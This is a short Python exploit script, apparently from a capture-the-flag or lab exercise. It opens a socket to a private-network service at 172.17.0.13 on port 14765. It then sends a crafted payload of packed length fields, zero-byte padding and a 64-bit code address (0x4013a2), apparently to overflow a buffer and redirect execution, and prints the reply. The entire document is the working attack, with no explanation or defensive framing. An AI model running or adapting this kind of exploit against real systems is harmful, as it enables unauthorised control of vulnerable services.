import socket, struct

HOST, PORT = "172.17.0.13", 14765

payload = struct.pack("<HH", 0x100, 0x100) + b"\x00" * 0x20 + struct.pack("<Q", 0x4013a2)

s = socket.create_connection((HOST, PORT))
s.send(payload)
s.shutdown(socket.SHUT_WR)
print(s.recv(4096))
